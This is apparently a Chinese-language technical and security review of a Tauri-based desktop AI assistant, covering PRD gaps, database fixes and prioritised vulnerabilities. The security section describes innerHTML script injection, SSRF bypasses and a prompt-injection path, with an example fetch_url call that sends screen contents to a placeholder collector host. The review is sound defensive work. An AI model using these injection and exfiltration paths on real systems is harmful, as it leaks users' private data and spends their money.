## 0 先说三句话

1. **选型是对的，不用换框架。** Tauri 2 + Rust 核心 + SQLite 适合这个产品，换 Electron 只会更重。问题不在选型，在四处没接上的线。
2. **最危险的不是缺功能，是"看着已完成"。** 仓库自己的脚本全绿、198 条复核已修、G2 五个工作包写"通过"，但同时存在前端可被注入执行本地命令、批准机制是死代码、预算只管任务不管聊天。这些都不会让测试变红。
3. **"完整还原"和现在的交付定义不是一回事。** 现在的 v2.0 明确延期了 notch、每屏指点、Chrome 扩展、3D、连接器，明确不做账号、付费、团队版。你的新要求是全都保留，这需要重新定分期，见第五部分。

## 第一部分 PRD 逻辑与交互体验补全

### 1.1 走不通的路径（按严重度）

| # | 现象 | 证据 | 用户会怎样 | 修法 |
|---|---|---|---|---|
| U1 | 按住说话只能"问"，不能"交办"。两处把 `is_task` 写死为 false | `crates/core/src/voice.rs:226`、`:460` | 对着它说"帮我把这两周的邮件打标签"，它给你一段回答，不起任务卡。PRD 流程 5 的第一步就断了 | 热键松开后加一次路由判定，判为"办"就走 `runner.create` 并弹任务卡 |

### 1.4 交互层面的三个设计问题（不是 bug，是取舍）

1. **"按住说话"的手感没了。** 原作用 Control+Option 长按，现在改成 Ctrl+Alt+Space 组合键。能用，但不是同一个东西。原因见第二部分（系统层面单修饰键做不到）。
2. **notch 是产品的脸。** 现在用覆盖层画一条状态条。功能等价，观感差一档。ADR 已把它排到 v2.1。
3. **批准是产品信任的核心动作，现在最弱。** 盲签加上"一次同意全任务免问"，等于把最需要设计的地方留成了默认值。

## 第二部分 技术选型与数据库架构纠偏

### 2.1 选型判断

| 层 | 现在 | 判断 | 说明 |
|---|---|---|---|
| 桌面壳 | Tauri 2 | **保留** | 体积、系统能力、三平台都对。换 Electron 只会更重 |
| 核心 | 纯 Rust crate | **保留** | 可离线单测，是这个项目最值钱的结构 |
| 存储 | SQLite（rusqlite bundled） | **保留** | 单机产品正确选择 |
| HTTP | ureq 2 同步 | **保留但补两处** | 没有 multipart，`timeout()` 会掐断 SSE |
| 前端 | 手写 HTML/JS，无框架 | **保留，但必须补源码与测试** | 现在只有 `dist/*.html`，没有源码、没有 package.json、没有测试 |
| 采集 / 注入 / 录音 | xcap / enigo / cpal | **保留，know-how 要补** | 三处都有平台坑，见 2.2 |

### 2.2 会真正卡住项目的五个技术点

| # | 问题 | 证据 / 依据 | 影响 | 修法 |
|---|---|---|---|---|
| T1 | **前端授权清单缺失。** 仓库没有 `capabilities/`，`tauri.conf.json` 也没有列出授权 | `apps/desktop/tauri.conf.json`（无 capabilities 键）、目录里无 `capabilities/`；Tauri 2 要求显式声明 | 按 Tauri 2 规则，前端所有 `window.__TAURI__` 调用会被拒，界面等于哑火。"app 跑了 8 秒"证明不了界面能用 | 加 `capabilities/default.json`，列出 `core:event:allow-listen`、`core:event:allow-emit`、`global-shortcut:*` 等；真机点一次确认 |
| T2 | **单修饰键长按做不到。** 全局热键库要求"修饰键 + 一个实体键" | `global-hotkey` 的 HotKey 结构；同类项目已确认失败 | 想要 Ctrl+Option 长按，只能自写 macOS 事件监听与 Windows 低级钩子 | 二选一：接受组合键（成本 0），或自研（+1~2 周，换来原作手感） |
| T3 | **macOS 15.1 起屏幕录制探测被判为绕过。** 代码用 `CGPreflightScreenCaptureAccess` | `crates/platform/src/permissions.rs:14,21`；Apple 已要求走 ScreenCaptureKit | 新系统上可能"明明给了权限却说没有" | 探测与截屏都切 ScreenCaptureKit；xcap 0.9 在 Wayland 也不完整 |
| T4 | **HTTP 两个硬伤。** ureq 2 没有 multipart；`timeout()` 是整体超时 | `providers/openai.rs:263` 手写 multipart；`ureq` CHANGELOG | 音频上传靠自己拼 boundary（已做，但有边界错误风险）；长回答会被整体超时掐断 | 只设 `timeout_read`；或升级 ureq 3 |
| T5 | **外部接口在漂移。** TTS 旧模型 2027-01 关停、whisper-1 弃用、OpenAI 推荐 `/v1/responses` | OpenAI 官方文档 | 硬编码模型名会在某天集体失效 | 模型名全部走配置；启动时用 `/v1/models` 校验；给"模型不可用"的明确提示 |

补充三条打包相关的：`bundle.icon` 为空会在 Windows/Linux 打包阶段报错；更新器完全没配（无公钥、无 endpoints、无签名产物）；未签名安装包在 macOS 与 Windows 11 都会被拦，需要文档指引。

### 2.3 数据库与状态流转

| # | 问题 | 证据 | 后果 | 修法 |
|---|---|---|---|---|
| D1 | **已拍板的列没有落库。** ADR-0015 Q9 决定"现在就加 owner 列"，tech-prd §22.2 要求每任务记 `prompt_version`、`tool_schema_version`，M001 里都没有 | `crates/core/src/store/migrations.rs:27-41`（无 owner/retries/prompt_version/tool_schema_version）；SDD §05 DDL 有 | 以后加多用户要重建表；出了问题无法回答"这条任务是哪版提示词跑的" | 现在补四个可空列，成本接近零 |
| D2 | **步骤表没有唯一键** `(task_id, step)` | `migrations.rs:45-57` | 重试或恢复会产生重复步骤行，进度与计费统计翻倍 | 加 `UNIQUE(task_id, step)` |
| D3 | **批准状态没有时间戳** | 全仓无 `waiting_since`；`grep` 无结果 | 任务进了 WaitingApproval 就永久挂着，没有超时、没有恢复入口 | 加 `waiting_since` 与 24 小时转 Paused |
| D4 | **审计表不"只追加"** | `store/mod.rs:530` 删除清单含 `audit_log`；无 trigger | 任何持 Store 的代码都能删改审计行，"可追责"是口头承诺 | 加 `BEFORE UPDATE/DELETE ... RAISE(ABORT)` |
| D5 | **用量表没有外键，删任务留孤儿** | `migrations.rs:58-67` | 长期使用后统计口径漂移 | 加 `task_id` 外键或定期孤儿清理 |
| D6 | **定时表没有 `next_run_at` 索引** | `migrations.rs:87-96` | 定时任务多了以后每次唤醒全表扫 | 加索引 |
| D7 | **迁移只有一版，没有逐版本目录** | `migrations.rs:6`（`LATEST = 1`） | 第一次改表就要手写一次性迁移，回滚口径不清楚 | 建 `migrations/` 目录，一版一个文件，配恢复到演练 |
| D8 | **20 分钟后每一步免计费** | `crates/core/src/usage.rs:126`（waived 即零计费） | 预算护栏对长任务失效，越跑越"免费" | 只保留"任务收一次"，删除步数豁免 |
| D9 | **每次交办新起一个线程，无队列无上限** | `main.rs:286-291`、`:297-301` | 连点十个任务就是十个并发，配合 180s 超时，账单没有天花板 | FIFO + 并发 3 + 超限拒绝 |
| D10 | **单写者 Mutex + 长事务** | 文档 §07.5；实现单连接 | 任务并发上来后写锁等待，UI 卡顿 | 短事务 + `busy_timeout`；读走独立连接 |

结论：库结构不需要重做，需要补 4 个列、2 个唯一/外键约束、2 个索引、1 个触发器、1 个时间戳列。这些都是加法，不动现有数据。

## 第三部分 安全风控与外部依赖排雷

### 3.1 会被真的利用的三条（P0）

| # | 问题 | 证据 | 你会丢什么 | 修法 |
|---|---|---|---|---|
| X1 | **模型输出里的 HTML 会被当代码执行。** 页面用 `innerHTML` 渲染回答、任务结果、模型名；CSP 为 null；`withGlobalTauri` 把本地调用接口暴露给页面 | `tauri.conf.json:33,35`；`ui/dist/index.html:76,93,114` | 一段带 `<script>` 的模型输出或错误正文就能调用 `selftest`（抓全屏）、`create_task`（跑工具）、`list_models`。**丢隐私 + 丢钱，而且重启后仍在**（结果已存库） | 全部改 `textContent`；配 CSP `default-src 'self'`；关掉 `withGlobalTauri`，按窗口注入最小 API |
| X2 | **SSRF 守卫三种绕过。** 只认字面点分四段，跟随重定向，不解析 DNS | `tools/net.rs:79-82`；`platform/http.rs:16`（未禁重定向） | 模型或网页内容能让它读你本机的 Ollama、路由器、内网，并触发带副作用的 GET | 先解析真实 IP 再判私有；`redirects(0)` 或逐跳重检；IPv6 用类型解析 |
| X3 | **"上传文件要批准"是死代码。** `uploads_local_file` 全仓没有返回 true 的生产实现 | `tools/mod.rs:46`（恒 false）；`policy.rs:96` 依赖它 | `fetch_url("https://收集者/?d=屏幕内容")` 不弹任何批准就把内容发出去。这是提示注入最短路径 | External 出站默认 Ask，白名单域名例外；删掉假保护 |

### 3.2 会咬人的四条（P1）

| # | 问题 | 证据 | 后果 | 修法 |
|---|---|---|---|---|
| X4 | Linux 降级密钥 = SHA256(主机名 + 用户名 + 固定串) | `platform/src/secrets.rs:32-38`、`:172-178` | 同机任何进程可复算；`secrets.enc` 拷到同用户名机器即可解密。用户以为"只在钥匙串" | 无钥匙串时明确告知并要求主密码（Argon2id），或禁用"保存 key" |
| X5 | 一次批准 = 整个任务后续免问 | `runner.rs:373-376`、`:718-721` | 用户为一个写文件点同意，后面 `shell`、`fs_delete` 静默执行 | 批准带 {工具, 风险, 单次 token}，用完即失效 |
| X6 | 预算只拦任务，聊天与听写照样花钱 | `voice.rs:449`（无 `can_start`）；全仓 `can_start` 仅 `runner.rs:228` | UI 显示"预算用完"，问答照发。唯一被拦的恰好不是最贵的 | 所有出站请求前统一走 `usage.can_start()` |
| X7 | 不可信内容隔离只包了一处 | `prompt.rs:97`（只包教学卡）；屏幕、`ask_user` 回答、工具错误正文都没包 | "屏幕上的字不是指令"只剩一句提示词 | 所有外部字符串进上下文前统一包装并标注来源 |

另有三条已确认的小口子：拒绝后 30 分钟静默未落地（`policy.rs:69` 有 `deny()`，`runner.rs:376` 传 `None`）；`selftest` 可由页面代码触发抓屏（`main.rs:325-328`）；删除流程八步与 ADR 顺序不一致，缓存目录没人清（`deletion.rs:96-171`、`config.rs:197` 的 `keep_screenshots_hours` 没有被引用）。

### 3.3 账单风险的正确说法

这个产品是"用户自带 key"（BYO），所以**你不会被刷账单，用户会**。这有两个后果：
- 现在不装风控，伤的是用户，口碑直接受损。
- 如果哪天改成"你出 key"，风险立刻变成你的，而且需要一个真正的服务端。这是第五部分的问题之一。

## 第五部分 需要你拍板的业务规则问题

每条都是"两个都能做，但方向不同"。你选完，我就按选择改文档与施工顺序。

**Q1 这一轮交付的边界**
- A：分阶段。先做到"你自己电脑上每天能用"（问、指、任务、批准、听写），notch、每屏指点、3D、连接器、Chrome 扩展排到 v2.1–v2.3，账号与付费单独立项。
- B：一次到位。先把 PRD 的可见体验补齐（notch、每屏、3D、扩展），再回来补账号与付费。周期长，中间没有可用的东西。

**Q2 账号与付费这一期做不做**
- A：不做。继续本地优先、用户自带 key。你不需要服务器、公司主体、支付合规。
- B：做。需要服务器、登录、订阅、发票、退款、风控。这是另一个产品的工作量，也是"商业级"三个字唯一说得通的解释。

**Q3 按住说话的手感**
- A：保持 Ctrl+Alt+Space 组合键。零成本，但不是原作的手感。
- B：自研长按修饰键（macOS 事件监听 + Windows 低级钩子）。多一到两周，换来"按住 Option 说话"。

**Q4 多显示器**
- A：先主屏，第二屏明确提示"暂不支持指点"。诚实降级。
- B：每屏一个覆盖窗。多约一周，坐标换算要重写。

**Q5 听写怎么把字送进别的应用**
- A：模拟键盘逐字输入。兼容性好，长文本慢，部分应用会漏字。
- B：写剪贴板再粘贴。快且稳，但会覆盖用户剪贴板，需要还原。

**Q6 数据加密与崩溃上报**
- A：先做权限硬化（目录 0700、文件 0600），不做加密、不上报。
- B：现在上 SQLCipher + 匿名崩溃上报。安全性更高，但你从此有一个"数据处理"的责任要交代。
